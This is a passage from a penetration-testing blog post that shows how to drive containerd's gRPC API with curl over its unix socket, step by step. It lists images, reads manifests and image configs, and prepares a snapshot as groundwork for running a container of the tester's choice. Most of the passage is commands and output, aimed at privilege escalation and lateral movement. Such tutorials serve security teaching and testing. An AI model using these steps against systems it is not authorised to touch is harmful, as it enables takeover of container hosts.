---
layout: post
title: "containerd socket exploitation part 3"
date: 2025-02-26 11:20:00 +1100
author: Stephen Bradshaw
tags:
- kubernetes
- api
- pentesting
- pentest
- container
- containerd
- ctr
- pod
- authentication
- credentials
- captured credentials
- privilege escalation
- lateral movement
- curl
---








# Running our own containers with curl

As with the `ctr` example, we want to list the local container images available locally first so we can identify an image to use for the container we want to run. The [images protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/images/v1/images.proto) can be used to view services relating to images. 

An important thing to note here is that this is the first of the .proto files we have looked at so far that has a github based dependency, which you can see [here](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/images/v1/images.proto#L24).

The line looks like this:

```
import "github.com/containerd/containerd/api/types/descriptor.proto";
```

In this case, we want to download the [depenency file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/types/descriptor.proto) individually, process it using `protoc`, store the .proto file and the generated Python output in the present working directory and change the import line as follows

```
import "descriptor.proto";
```

Remember to do this for all future .proto files to make sure they will work correctly.


Now, heres the list of services related to the `image.proto` descriptor:

```
$ ./protobuf_parser.py -m images_pb2.py
Services:
* /containerd.services.images.v1.Images/Get
      Input: GetImageRequest
      Output: GetImageResponse
* /containerd.services.images.v1.Images/List
      Input: ListImagesRequest
      Output: ListImagesResponse
* /containerd.services.images.v1.Images/Create
      Input: CreateImageRequest
      Output: CreateImageResponse
* /containerd.services.images.v1.Images/Update
      Input: UpdateImageRequest
      Output: UpdateImageResponse
* /containerd.services.images.v1.Images/Delete
      Input: DeleteImageRequest
      Output: Empty

==================================

[SNIP]
```


As we see from the above, the `List` operation involves sending `ListImagesRequest` messages and getting `ListImagesResponses` in response. The definitions for these messages from the output of the command above are like so:


```
* ListImagesRequest
  Fields:
      filters - string

  Rough JSON example (might need tweaking):

{
    "filters": "string"
}

==================================
* ListImagesResponse
  Fields:
      images - Image

  Rough JSON example (might need tweaking):

{
    "images": {"name": "string", "labels": "LabelsEntry", "target": "Descriptor", "created_at": "Timestamp", "updated_at": "Timestamp"}
}

[SNIP]
```

As with some of the previous examples, the `ListImagesRequest` message has a single input field `filters`, which can be left empty if we want to list all images, meaning we can use a empty message type as input again. The following command shows how to list images in the `k8s.io` namespace.


```
$ echo -ne "\x00\x00\x00\x00\x00" | sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.images.v1.Images/List --data-binary @- --output /tmp/listimagesresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55f7bd403ec0)
> POST /containerd.services.images.v1.Images/List HTTP/2
> Host: localhost
> user-agent: curl/7.81.0
> accept: */*
> content-type: application/grpc
> te: trailers
> grpc-accept-encoding: gzip
> containerd-namespace: k8s.io
> content-length: 5
>
} [5 bytes data]
* We are completely uploaded and fine
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
< HTTP/2 200
< content-type: application/grpc
<
{ [32727 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact

```

The response in file `/tmp/listimagesresponse.bin` is a `ListImagesResponse`, and we can parse it and check for `nginx` images as we did in the `ctr` example above like so:

```
$ ./protobuf_parser.py -m images_pb2.py -d /tmp/listimagesresponse.bin -t ListImagesResponse | grep nginx
  name: "docker.io/library/nginx:1.14.2"
  name: "docker.io/library/nginx@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755"
  name: "docker.io/library/nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d"

[SNIP]
```

We have the image identifier for our nginx image `docker.io/library/nginx:1.14.2`.


Now we want to get the image details. From the previous services listing for the Image service above, we can see the `Get` operation involves sending `GetImageRequest` messages and getting `GetImageResponse` in response. The definitions for these messages from the output of the command above are like so:

```
==================================
* GetImageRequest
  Fields:
      name - string

  Rough JSON example (might need tweaking):

{
    "name": "string"
}

==================================
* GetImageResponse
  Fields:
      image - Image

  Rough JSON example (might need tweaking):

{
    "image": {"name": "string", "labels": "LabelsEntry", "target": "Descriptor", "created_at": "Timestamp", "updated_at": "Timestamp"}
}

```

In this case we actually need to send a protobuf message with some content in it. We can create one from a JSON template using the protobuf_parser.py tool like so.

```
$ cat getimage.json
{"name": "docker.io/library/nginx:1.14.2"}
$ ./protobuf_parser.py -m images_pb2.py -t GetImageRequest -i getimage.json -o /tmp/getimage.bin
Written to /tmp/getimage.bin
```

The message has been encoded into a protobuf binary format in file `/tmp/getimage.bin`. We can either read this directly from its file with curl (shown below) or we could hexlify it and pipe it to curl using the echo command after encoding it (a tool to do this is available [here](https://github.com/stephenbradshaw/pentesting_stuff/blob/master/containerd/echoer.py) if needed). 

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.images.v1.Images/Get --data-binary @/tmp/getimage.bin --output /tmp/getimageresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x561c6e1d7eb0)
> POST /containerd.services.images.v1.Images/Get HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 37
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [37 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [242 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

The `GetImageResponse` formated response is in file `/tmp/getimageresponse.bin` as created by curl in the command above. We can parse it like so.

```
$ ./protobuf_parser.py -m images_pb2.py -d /tmp/getimageresponse.bin -t GetImageResponse
image {
  name: "docker.io/library/nginx:1.14.2"
  labels {
    key: "io.cri-containerd.image"
    value: "managed"
  }
  target {
    media_type: "application/vnd.docker.distribution.manifest.list.v2+json"
    digest: "sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d"
    size: 2029
  }
  created_at {
    seconds: 1697590445
    nanos: 454204347
  }
  updated_at {
    seconds: 1697590450
    nanos: 558546668
  }
}
```

This gives us a manifest list for this image, which is a list of a number of manifests

We next need to get some information about the content of the manifest list now, for which we can use the [content protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/content/v1/content.proto). 

The services associated with this API are as follows.


```
$ ./protobuf_parser.py -m content_pb2.py
Services:
* /containerd.services.content.v1.Content/Info
      Input: InfoRequest
      Output: InfoResponse
* /containerd.services.content.v1.Content/Update
      Input: UpdateRequest
      Output: UpdateResponse
* /containerd.services.content.v1.Content/List
      Input: ListContentRequest
      Output: ListContentResponse
* /containerd.services.content.v1.Content/Delete
      Input: DeleteContentRequest
      Output: Empty
* /containerd.services.content.v1.Content/Read
      Input: ReadContentRequest
      Output: ReadContentResponse
* /containerd.services.content.v1.Content/Status
      Input: StatusRequest
      Output: StatusResponse
* /containerd.services.content.v1.Content/ListStatuses
      Input: ListStatusesRequest
      Output: ListStatusesResponse
* /containerd.services.content.v1.Content/Write
      Input: WriteContentRequest
      Output: WriteContentResponse
* /containerd.services.content.v1.Content/Abort
      Input: AbortRequest
      Output: Empty
```


To get the content of the manifest list we are interested in the `/containerd.services.content.v1.Content/Read` service, which uses the `ReadContentRequest` and `ReadContentResponse`



```
==================================
* ReadContentRequest
  Fields:
      digest - string
      offset - int64
      size - int64

  Rough JSON example (might need tweaking):

{
    "digest": "string",
    "offset": int64,
    "size": int64
}

==================================
* ReadContentResponse
  Fields:
      offset - int64
      data - string

  Rough JSON example (might need tweaking):

{
    "offset": int64,
    "data": "string"
}

```


"sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d"
  size: 2029



```
$ cat readcontentrequest.json
{"digest": "sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d", "size": 2029}
$ ./protobuf_parser.py -m content_pb2.py -t ReadContentRequest -i readcontentrequest.json -o readcontentrequest.bin
Written to readcontentrequest.bin
```



```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Read --data-binary @readcontentrequest.bin --output readcontentresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55ec533d1eb0)
> POST /containerd.services.content.v1.Content/Read HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 81
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [81 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [2037 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

Parse the response 

```
$ ./protobuf_parser.py -m content_pb2.py -t ReadContentResponse -d readcontentresponse.bin
data: "{\n   "schemaVersion": 2,\n   "mediaType": "application/vnd.docker.distribution.manifest.list.v2+json",\n   "manifests": [\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078",\n         "platform": {\n            "architecture": "amd64",\n            "os": "linux"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:17a1998407746106c307c58c5089569bc1d0728567657b8c19ccffd0497c91ba",\n         "platform": {\n            "architecture": "arm",\n            "os": "linux",\n            "variant": "v7"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:d58b3e481b8588c080b42e5d7427f2c2061decbf9194f06e2adce641822e282a",\n         "platform": {\n            "architecture": "arm64",\n            "os": "linux",\n            "variant": "v8"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:de4556bb2971a581b6ce23bcbfd3dbef6ee1640839d2c88b3e846a4e101f363c",\n         "platform": {\n            "architecture": "386",\n            "os": "linux"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:750c35f5051eebd0d1a2faa08a29d3eabd330c8cf0350b57353d205a99c47176",\n         "platform": {\n            "architecture": "ppc64le",\n            "os": "linux"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:e76ff864168bca4ef1a53cfaf5fb4981cdb2810385b4b4edc19fd94a5d04eb38",\n         "platform": {\n            "architecture": "s390x",\n            "os": "linux"\n         }\n      }\n   ]\n}"
```


The response is a list of manifests. We want the one that matches the architecture of the current system, in this case we want the `amd64` one, which is the manifest with identifier `sha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078` with size `948`. We now craft up another request to get the container image details from this manifest.


```
$ cat readcontentrequest2.json
{"digest": "sha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078", "size": 948}
$ ./protobuf_parser.py -m content_pb2.py -t ReadContentRequest -i readcontentrequest2.json -o readcontentrequest2.bin
Written to readcontentrequest2.bin
```

Send the request.

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Read --data-binary @readcontentrequest2.bin --output readcontentresponse2.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x562fb0428eb0)
> POST /containerd.services.content.v1.Content/Read HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 81
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [81 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [956 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

Parse the response.


```
$ ./protobuf_parser.py -m content_pb2.py -t ReadContentResponse -d readcontentresponse2.bin
data: "{\n   "schemaVersion": 2,\n   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n   "config": {\n      "mediaType": "application/vnd.docker.container.image.v1+json",\n      "size": 6003,\n      "digest": "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369"\n   },\n   "layers": [\n      {\n         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",\n         "size": 22496048,\n         "digest": "sha256:27833a3ba0a545deda33bb01eaf95a14d05d43bf30bce9267d92d17f069fe897"\n      },\n      {\n         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",\n         "size": 22204973,\n         "digest": "sha256:0f23e58bd0b7c74311703e20c21c690a6847e62240ed456f8821f4c067d3659b"\n      },\n      {\n         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",\n         "size": 203,\n         "digest": "sha256:8ca774778e858d3f97d9ec1bec1de879ac5e10096856dc22ed325a3ad944f78a"\n      }\n   ]\n}"

```

From this we want to get the container image identifier. It has this identifier `sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369` and a size of 6003.


We need to do an `/containerd.services.content.v1.Content/Info` request to get the snapshot uid for this container. This API call uses the `InfoRequest` and `InfoResponse` messages, which we can get the details for from the parsing of the `content.proto` file that we performed earlier by running `./protobuf_parser.py -m content_pb2.py`. The relevent output from the command is as follows:


```
==================================
* InfoRequest
  Fields:
      digest - string

  Rough JSON example (might need tweaking):

{
    "digest": "string"
}

==================================
* InfoResponse
  Fields:
      info - Info

  Rough JSON example (might need tweaking):

{
    "info": {"digest": "string", "size": "int64", "created_at": "Timestamp", "updated_at": "Timestamp", "labels": "LabelsEntry"}
}
```

Lets create an `InfoRequest` request for the container image we identified above.


```
$ cat inforequest.json
{"digest": "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369"}
$ ./protobuf_parser.py -m content_pb2.py -t InfoRequest -i inforequest.json -o inforequest.bin
Written to inforequest.bin
```

Now send the request.

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Info --data-binary @inforequest.bin --output inforesponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55ca70ebaeb0)
> POST /containerd.services.content.v1.Content/Info HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 78
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [78 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [290 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

Now lets parse the response so we can get the snapshot overlay

```
$ ./protobuf_parser.py -m content_pb2.py -t InfoResponse -d inforesponse.bin
info {
  digest: "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369"
  size: 6003
  created_at {
    seconds: 1697590436
    nanos: 851140635
  }
  updated_at {
    seconds: 1697590450
    nanos: 555865938
  }
  labels {
    key: "containerd.io/gc.ref.snapshot.overlayfs"
    value: "sha256:19606512dfe192788a55d7c1efb9ec02041b4e318587632f755c5112f927e0e3"
  }
  labels {
    key: "containerd.io/distribution.source.docker.io"
    value: "library/nginx"
  }
}
```

From the above, the identifier of the overlay snapshot identifier is `sha256:19606512dfe192788a55d7c1efb9ec02041b4e318587632f755c5112f927e0e3`. We will use this in the moment to create a snapshot 


We also want to get some details about the image itself for use when we create the container - we can do this using the `/containerd.services.content.v1.Content/Read` API call, which uses `ReadContentRequest` and `ReadContentResponse` messages.

These look like the following:

```

* ReadContentRequest
  Fields:
      digest - string
      offset - int64
      size - int64

  Rough JSON example (might need tweaking):

{
    "digest": "string",
    "offset": int64,
    "size": int64
}

==================================
* ReadContentResponse
  Fields:
      offset - int64
      data - string

  Rough JSON example (might need tweaking):

{
    "offset": int64,
    "data": "string"
}

```

Lets create a message 

```
$ cat readcontentrequest.json
{"digest": "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369", "size": 6003}
$ ./protobuf_parser.py -m content_pb2.py -i readcontentrequest.json -o readcontentrequest.bin -t ReadContentRequest
Written to readcontentrequest.bin
```

Make the request.

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Read --data-binary @readcontentrequest.bin --output readcontentresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x5594f4dd9eb0)
> POST /containerd.services.content.v1.Content/Read HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 81
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [81 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [6011 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

Now lets look at the response:

```
$ ./protobuf_parser.py -m content_pb2.py -d readcontentresponse.bin -t ReadContentResponse
data: "{"architecture":"amd64","config":{"Hostname":"","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"80/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","NGINX_VERSION=1.14.2-1~stretch","NJS_VERSION=1.14.2.0.2.6-1~stretch"],"Cmd":["nginx","-g","daemon off;"],"ArgsEscaped":true,"Image":"sha256:ac539667b75fa925232b8dbbfdfb8adb98007c44e11a5fbd4001916c0fcc0bd4","Volumes":null,"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":{"maintainer":"NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e"},"StopSignal":"SIGTERM"},"container":"5e8d96e0fb01832974f0680a9aff2fbadc37fcf30447ae30e19f59b926672041","container_config":{"Hostname":"5e8d96e0fb01","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"80/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","NGINX_VERSION=1.14.2-1~stretch","NJS_VERSION=1.14.2.0.2.6-1~stretch"],"Cmd":["/bin/sh","-c","#(nop) ","CMD [\"nginx\" \"-g\" \"daemon off;\"]"],"ArgsEscaped":true,"Image":"sha256:ac539667b75fa925232b8dbbfdfb8adb98007c44e11a5fbd4001916c0fcc0bd4","Volumes":null,"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":{"maintainer":"NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e"},"StopSignal":"SIGTERM"},"created":"2019-03-26T23:14:52.227945051Z","docker_version":"18.06.1-ce","history":[{"created":"2019-03-26T22:41:26.106246179Z","created_by":"/bin/sh -c #(nop) ADD file:4fc310c0cb879c876c5c0f571af665a0d24d36cb9263e0f53b0cda2f7e4b1844 in / "},{"created":"2019-03-26T22:41:26.302497847Z","created_by":"/bin/sh -c #(nop)  CMD [\"bash\"]","empty_layer":true},{"created":"2019-03-26T23:13:16.970741082Z","created_by":"/bin/sh -c #(nop)  LABEL maintainer=NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e","empty_layer":true},{"created":"2019-03-26T23:14:26.130250839Z","created_by":"/bin/sh -c #(nop)  ENV NGINX_VERSION=1.14.2-1~stretch","empty_layer":true},{"created":"2019-03-26T23:14:26.292539689Z","created_by":"/bin/sh -c #(nop)  ENV NJS_VERSION=1.14.2.0.2.6-1~stretch","empty_layer":true},{"created":"2019-03-26T23:14:50.851725507Z","created_by":"/bin/sh -c set -x \t\u0026\u0026 apt-get update \t\u0026\u0026 apt-get install --no-install-recommends --no-install-suggests -y gnupg1 apt-transport-https ca-certificates \t\u0026\u0026 \tNGINX_GPGKEY=573BFD6B3D8FBC641079A6ABABF5BD827BD9BF62; \tfound=''; \tfor server in \t\tha.pool.sks-keyservers.net \t\thkp://keyserver.ubuntu.com:80 \t\thkp://p80.pool.sks-keyservers.net:80 \t\tpgp.mit.edu \t; do \t\techo \"Fetching GPG key $NGINX_GPGKEY from $server\"; \t\tapt-key adv --keyserver \"$server\" --keyserver-options timeout=10 --recv-keys \"$NGINX_GPGKEY\" \u0026\u0026 found=yes \u0026\u0026 break; \tdone; \ttest -z \"$found\" \u0026\u0026 echo \u003e\u00262 \"error: failed to fetch GPG key $NGINX_GPGKEY\" \u0026\u0026 exit 1; \tapt-get remove --purge --auto-remove -y gnupg1 \u0026\u0026 rm -rf /var/lib/apt/lists/* \t\u0026\u0026 dpkgArch=\"$(dpkg --print-architecture)\" \t\u0026\u0026 nginxPackages=\" \t\tnginx=${NGINX_VERSION} \t\tnginx-module-xslt=${NGINX_VERSION} \t\tnginx-module-geoip=${NGINX_VERSION} \t\tnginx-module-image-filter=${NGINX_VERSION} \t\tnginx-module-njs=${NJS_VERSION} \t\" \t\u0026\u0026 case \"$dpkgArch\" in \t\tamd64|i386) \t\t\techo \"deb https://nginx.org/packages/debian/ stretch nginx\" \u003e\u003e /etc/apt/sources.list.d/nginx.list \t\t\t\u0026\u0026 apt-get update \t\t\t;; \t\t*) \t\t\techo \"deb-src https://nginx.org/packages/debian/ stretch nginx\" \u003e\u003e /etc/apt/sources.list.d/nginx.list \t\t\t\t\t\t\u0026\u0026 tempDir=\"$(mktemp -d)\" \t\t\t\u0026\u0026 chmod 777 \"$tempDir\" \t\t\t\t\t\t\u0026\u0026 savedAptMark=\"$(apt-mark showmanual)\" \t\t\t\t\t\t\u0026\u0026 apt-get update \t\t\t\u0026\u0026 apt-get build-dep -y $nginxPackages \t\t\t\u0026\u0026 ( \t\t\t\tcd \"$tempDir\" \t\t\t\t\u0026\u0026 DEB_BUILD_OPTIONS=\"nocheck parallel=$(nproc)\" \t\t\t\t\tapt-get source --compile $nginxPackages \t\t\t) \t\t\t\t\t\t\u0026\u0026 apt-mark showmanual | xargs apt-mark auto \u003e /dev/null \t\t\t\u0026\u0026 { [ -z \"$savedAptMark\" ] || apt-mark manual $savedAptMark; } \t\t\t\t\t\t\u0026\u0026 ls -lAFh \"$tempDir\" \t\t\t\u0026\u0026 ( cd \"$tempDir\" \u0026\u0026 dpkg-scanpackages . \u003e Packages ) \t\t\t\u0026\u0026 grep '^Package: ' \"$tempDir/Packages\" \t\t\t\u0026\u0026 echo \"deb [ trusted=yes ] file://$tempDir ./\" \u003e /etc/apt/sources.list.d/temp.list \t\t\t\u0026\u0026 apt-get -o Acquire::GzipIndexes=false update \t\t\t;; \tesac \t\t\u0026\u0026 apt-get install --no-install-recommends --no-install-suggests -y \t\t\t\t\t\t$nginxPackages \t\t\t\t\t\tgettext-base \t\u0026\u0026 apt-get remove --purge --auto-remove -y apt-transport-https ca-certificates \u0026\u0026 rm -rf /var/lib/apt/lists/* /etc/apt/sources.list.d/nginx.list \t\t\u0026\u0026 if [ -n \"$tempDir\" ]; then \t\tapt-get purge -y --auto-remove \t\t\u0026\u0026 rm -rf \"$tempDir\" /etc/apt/sources.list.d/temp.list; \tfi"},{"created":"2019-03-26T23:14:51.711682497Z","created_by":"/bin/sh -c ln -sf /dev/stdout /var/log/nginx/access.log \t\u0026\u0026 ln -sf /dev/stderr /var/log/nginx/error.log"},{"created":"2019-03-26T23:14:51.894981136Z","created_by":"/bin/sh -c #(nop)  EXPOSE 80","empty_layer":true},{"created":"2019-03-26T23:14:52.059858592Z","created_by":"/bin/sh -c #(nop)  STOPSIGNAL SIGTERM","empty_layer":true},{"created":"2019-03-26T23:14:52.227945051Z","created_by":"/bin/sh -c #(nop)  CMD [\"nginx\" \"-g\" \"daemon off;\"]","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:5dacd731af1b0386ead06c8b1feff9f65d9e0bdfec032d2cd0bc03690698feda","sha256:b8f18c3b860b067be09836beadd676a0aa1e784ec28cf730986859b4146c344a","sha256:82ae01d5004e2143b642b1a008624e7521c73ab18e5776a22f18a172b9dbec80"]}}"

```

Theres is information here that we will use when we create our container spec later on `args` from the `Cmd` value and `env` from `Env` and some label values.

Now, using this, we need to create a snapshot for the containers storage . The [snapshot protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/snapshots/v1/snapshots.proto) can be used to view services relating to snapshots. It has a dependency on the [mount.proto](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/types/mount.proto) definition so make sure you process this first as previously discussed.


These are the services supported in the protocol definition:

```
$ ./protobuf_parser.py -m snapshots_pb2.py
Services:
* /containerd.services.snapshots.v1.Snapshots/Prepare
      Input: PrepareSnapshotRequest
      Output: PrepareSnapshotResponse
* /containerd.services.snapshots.v1.Snapshots/View
      Input: ViewSnapshotRequest
      Output: ViewSnapshotResponse
* /containerd.services.snapshots.v1.Snapshots/Mounts
      Input: MountsRequest
      Output: MountsResponse
* /containerd.services.snapshots.v1.Snapshots/Commit
      Input: CommitSnapshotRequest
      Output: Empty
* /containerd.services.snapshots.v1.Snapshots/Remove
      Input: RemoveSnapshotRequest
      Output: Empty
* /containerd.services.snapshots.v1.Snapshots/Stat
      Input: StatSnapshotRequest
      Output: StatSnapshotResponse
* /containerd.services.snapshots.v1.Snapshots/Update
      Input: UpdateSnapshotRequest
      Output: UpdateSnapshotResponse
* /containerd.services.snapshots.v1.Snapshots/List
      Input: ListSnapshotsRequest
      Output: ListSnapshotsResponse
* /containerd.services.snapshots.v1.Snapshots/Usage
      Input: UsageRequest
      Output: UsageResponse
* /containerd.services.snapshots.v1.Snapshots/Cleanup
      Input: CleanupRequest
      Output: Empty
```


We want to create a snapshot, for which we use the `/containerd.services.snapshots.v1.Snapshots/Prepare` api, which uses the `PrepareSnapshotRequest` and `PrepareSnapshotResponse` messages.

These look like the following:

```
* PrepareSnapshotRequest
  Fields:
      snapshotter - string
      key - string
      parent - string
      labels - LabelsEntry

  Rough JSON example (might need tweaking):

{
    "snapshotter": "string",
    "key": "string",
    "parent": "string",
    "labels": LabelsEntry
}

==================================
* PrepareSnapshotResponse
  Fields:
      mounts - Mount

  Rough JSON example (might need tweaking):

{
    "mounts": {"type": "string", "source": "string", "target": "string", "options": "string"}
}

```

Create a snapshot request like so:

```
$ cat preparesnapshotrequest.json
{"snapshotter": "overlayfs", "key": "nginx", "parent": "sha256:19606512dfe192788a55d7c1efb9ec02041b4e318587632f755c5112f927e0e3"}
$ ./protobuf_parser.py -m snapshots_pb2.py -i preparesnapshotrequest.json -o preparesnapshotrequest.bin -t PrepareSnapshotRequest
Written to preparesnapshotrequest.bin
```


Send the request
```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.snapshots.v1.Snapshots/Prepare --data-binary @preparesnapshotrequest.bin --output preparesnapshotresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
